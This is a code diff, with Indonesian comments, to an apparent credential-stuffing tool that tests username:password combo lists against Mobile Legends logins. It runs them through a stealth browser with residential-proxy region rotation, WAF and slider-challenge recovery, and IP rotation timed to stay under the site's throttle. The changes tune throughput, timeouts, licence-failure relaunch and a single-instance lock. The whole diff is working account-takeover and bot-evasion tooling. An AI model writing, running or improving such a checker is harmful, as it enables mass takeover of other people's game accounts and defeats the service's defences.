@@ -76,6 +76,51 @@ def withdraw_cloak_license() -> None:
         except Exception:
             pass
 
+def _acquire_instance_lock():
+    """Cegah 2 proses browser.py berjalan bersamaan di mesin yang sama dan berebut seat CloakBrowser."""
+    import tempfile
+    lock_path = os.path.join(tempfile.gettempdir(), "mlbb_cloak_checker.lock")
+    fh = open(lock_path, "a+")
+    try:
+        if os.name == 'nt':
+            import msvcrt
+            fh.seek(0)
+            msvcrt.locking(fh.fileno(), msvcrt.LK_NBLCK, 1)
+        else:
+            import fcntl
+            fcntl.flock(fh.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
+        fh.seek(0)
+        fh.truncate()
+        fh.write(str(os.getpid()))
+        fh.flush()
+        return fh
+    except Exception:
+        try:
+            fh.seek(0)
+            old_pid = fh.read().strip()
+        except Exception:
+            old_pid = "?"
+        fh.close()
+        raise RuntimeError(f"Sudah ada instance browser.py aktif (PID {old_pid}). Hentikan dulu sebelum menjalankan yang baru.")
+
+def _release_instance_lock(fh):
+    if not fh:
+        return
+    try:
+        if os.name == 'nt':
+            import msvcrt
+            fh.seek(0)
+            msvcrt.locking(fh.fileno(), msvcrt.LK_UNLCK, 1)
+        else:
+            import fcntl
+            fcntl.flock(fh.fileno(), fcntl.LOCK_UN)
+    except Exception:
+        pass
+    try:
+        fh.close()
+    except Exception:
+        pass
+
 def _emergency_cleanup():
     global _driver_pid
     if _driver_pid:
@@ -159,6 +204,7 @@ TG_ON    = bool(TG_TOKEN and TG_CHAT)
 # Defaults
 HEADLESS             = True
 NUM_CONTEXTS         = 1
+TWO_TAB              = False
 MAX_WAF_RETRY        = 2   # FIX: 4→2; worst-case 1 new context per akun, bukan 2
 ACCOUNTS_PER_SESSION = 150  # FIX: 25→150; kurangi frekuensi full page reload (~17MB/reload)
 DEBUG                = False
@@ -646,8 +692,7 @@ def generate_combo(count: int) -> str:
 # ── DataImpulse Proxy & Region Rotation (checker.js 1:1) ─────────────────────
 # Urutan: region Asia-SEA dulu (paling stabil untuk MLBB), baru sisanya
 # Jangan masukkan negara yang selalu ERR_TUNNEL (AF, AX, AL, DZ, AD, AI, AO, dll)
-DATAIMPULSE_REGIONS = ['sg', 'id', 'ph', 'my', 'th', 'vn', 'jp', 'tw', 'kr',
-                       'hk', 'in', 'au', 'us']
+DATAIMPULSE_REGIONS = ['sg', 'jp', 'kr', 'ph', 'my', 'id', 'tw', 'th', 'hk']
 # Negara yang terbukti ERR_TUNNEL → di-skip saat rotasi
 _TUNNEL_BLACKLIST = {
     'af','ax','al','dz','ad','ai','ao','aq','am','aw','az',
@@ -1112,7 +1157,7 @@ async def solve_waf(page, ctx) -> bool:
     return False
 
 # ── Smart Browser Launcher (CloakBrowser Pro with Playwright Chrome fallback) ─
-async def launch_browser_smart(headless=True, humanize=True):
+async def launch_browser_smart(headless=True, humanize=False):
     global _driver_pid, _pw_instance
     c_args = [
         '--disable-blink-features=AutomationControlled',
@@ -1124,9 +1169,9 @@ async def launch_browser_smart(headless=True, humanize=True):
     ]
     try:
         lic_key = _ACTIVE_LICENSE_KEY or activate_cloak_license()
-        # ponytail: keep CloakBrowser Pro native stealth & humanize intact (no --disable-gpu / custom args override)
+        # ponytail: keep CloakBrowser Pro native stealth intact while avoiding Playwright mouse-hook jitter on multi-worker touch drag
         b = await asyncio.wait_for(
-            launch_async(headless=headless, humanize=True, license_key=lic_key or None),
+            launch_async(headless=headless, humanize=humanize, license_key=lic_key or None),
             timeout=20.0,
         )
         if not _TUI_ACTIVE: p_out(f"{c(GREEN)}[*] CloakBrowser Pro siap ✓{W}")
@@ -1380,7 +1425,7 @@ async def do_login_via_browser(page, ctx, user: str, passw: str, wid: int = 0) -
                 resp_event.clear()
                 api_result["had_waf"] = False
                 try:
-                    await asyncio.wait_for(resp_event.wait(), timeout=0.15)
+                    await asyncio.wait_for(resp_event.wait(), timeout=0.7)
                 except asyncio.TimeoutError:
                     pass
                 if not api_result["json"] and not api_result["had_waf"]:
@@ -1600,8 +1645,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
             return False
 
         slider_cleared = True
-        # ponytail: buka Tab 2 berbagi cookie WAF + sticky IP yang sama (2x speed, 0 quota JS/CSS)
-        if page2 is None and ctx is not None:
+        # ponytail: Tab 2 opsional (--two-tab); default 1 tab/context agar bebas tab collision & 100% slider stabil
+        if TWO_TAB and page2 is None and ctx is not None:
             try:
                 page2 = await ctx.new_page()
                 await _attach_page(page2)
@@ -1624,7 +1669,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     loop = asyncio.get_running_loop()
                     info_res = await asyncio.wait_for(
                         loop.run_in_executor(None, get_player_info, guid_int, sess, dm),
-                        timeout=8.0,
+                        timeout=15.0,
                     )
                 except Exception as ie:
                     dbg(f"w{wid} lookup err ({guid_int}): {ie}")
@@ -1691,7 +1736,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
     ctx_accts = 0
     inflight_tabs = 0
     recovering = False
-    ACCOUNTS_PER_CTX = 30  # ponytail: proactive IP rotation before Aliyun ~25-35 acct throttle wall
+    ACCOUNTS_PER_CTX = 80  # ponytail: keeps fast sticky contexts; prevents Aliyun throttle over long runs
 
     async def _recover_ctx(local_gen: int, reason: str):
         nonlocal ctx_gen, ctx_accts, slider_cleared, recovering
@@ -1810,6 +1855,16 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                         await asyncio.sleep(0.1)
                         continue
 
+                    err_low = err_msg.lower()
+                    if any(k in err_low for k in ('cloakbrowser', 'license key', 'session limit', 'browser has been closed', 'browser closed')):
+                        # Browser/license failure: do NOT record account in err.txt; re-queue & restart browser cleanly
+                        activate_cloak_license()
+                        if 'session limit' in err_low:
+                            await asyncio.sleep(15.0)
+                        if ensure_browser:
+                            await ensure_browser(force_relaunch=True)
+                        raise RuntimeError(f"w{wid}_browser_license_restart")
+
                     k_id = f"{u}:{pw}"
                     _acct_retries[k_id] = _acct_retries.get(k_id, 0) + 1
                     if _acct_retries[k_id] > 3:
@@ -1823,7 +1878,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     if kind == 'WAF':
                         stats['waf'] += 1
-                        waf_mode = 'rotate' if (ctx_accts > 0 or _acct_retries[k_id] >= 2) else 'waf_refresh'
+                        waf_mode = 'rotate' if _acct_retries[k_id] >= 2 else 'waf_refresh'
                         if not await _recover_ctx(my_gen, waf_mode):
                             raise RuntimeError(f"w{wid}_waf_recovery_failed")
                     elif kind == 'RATE' or any(k in err_msg for k in ('TUNNEL', 'PROXY', 'CONNECTION_FAILED', 'Connection closed', 'Target closed')) or err_msg == 'timeout_waiting_response':
@@ -1840,7 +1895,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     combo_q.task_done()
                 raise
 
-    tab_tasks = [asyncio.create_task(_tab_loop(0)), asyncio.create_task(_tab_loop(1))]
+    tab_tasks = [asyncio.create_task(_tab_loop(0))] + ([asyncio.create_task(_tab_loop(1))] if TWO_TAB else [])
     try:
         # Run Tab 0 and Tab 1 independently without waiting for the slower tab in each pair
         await asyncio.gather(*tab_tasks)
@@ -1896,6 +1951,7 @@ async def async_main():
     pa.add_argument('--proxy-file', type=str, default='')
     pa.add_argument('--no-proxy', action='store_true', default=False)
     pa.add_argument('--license-key', type=str, default='')
+    pa.add_argument('--two-tab', action='store_true', default=False)
     pa.add_argument('--selftest', action='store_true')
     args = pa.parse_args()
 
@@ -1929,7 +1985,8 @@ async def async_main():
         print("[✓] All self-tests passed successfully!")
         return
 
-    global DEBUG, HEADLESS, NUM_CONTEXTS, PROXY_ENABLED, PROXY_FILE, OUTPUT_DIR, _TUI_ACTIVE, _pw_instance, _driver_pid
+    global DEBUG, HEADLESS, NUM_CONTEXTS, TWO_TAB, PROXY_ENABLED, PROXY_FILE, OUTPUT_DIR, _TUI_ACTIVE, _pw_instance, _driver_pid
+    TWO_TAB = bool(args.two_tab)
 
     combo_path = ''
     workers = 3
@@ -2032,6 +2089,13 @@ async def async_main():
         except Exception as e:
             p_out(f"{c(GOLD)}[!] DeviceManager init note: {e}{W}")
 
+    # Pastikan hanya 1 instance browser.py berjalan agar seat CloakBrowser & CPU tidak bentrok
+    try:
+        _inst_lock = _acquire_instance_lock()
+    except RuntimeError as le:
+        p_out(f"{c(RED)}[!] {le}{W}")
+        return
+
     # Launch browser utama (CloakBrowser Pro / Fallback Playwright Chrome)
     activate_cloak_license(args.license_key)
     p_out(f"{c(CYAN)}[*] Menyiapkan engine browser...{W}")
@@ -2065,11 +2129,11 @@ async def async_main():
                     _pw_instance = None
                 if force_relaunch:
                     await asyncio.sleep(2.0)
-                browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=True)
+                browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=False)
             return browser_ref[0]
 
     try:
-        browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=True)
+        browser_ref[0] = await launch_browser_smart(headless=HEADLESS, humanize=False)
 
         # Proxy testing & assignment
         proxy_assignments = [None] * NUM_CONTEXTS
@@ -2177,6 +2241,7 @@ async def async_main():
         if _LICENSE_SESSION_ACTIVE:
             withdraw_cloak_license()
             p_out(f"{c(GRAY)}[*] License key CloakBrowser ditarik dari device ✓{W}")
+        _release_instance_lock(_inst_lock)
 
     el = max(time.time() - stats['start'], 1)
     px = stats['proxy_ctx']
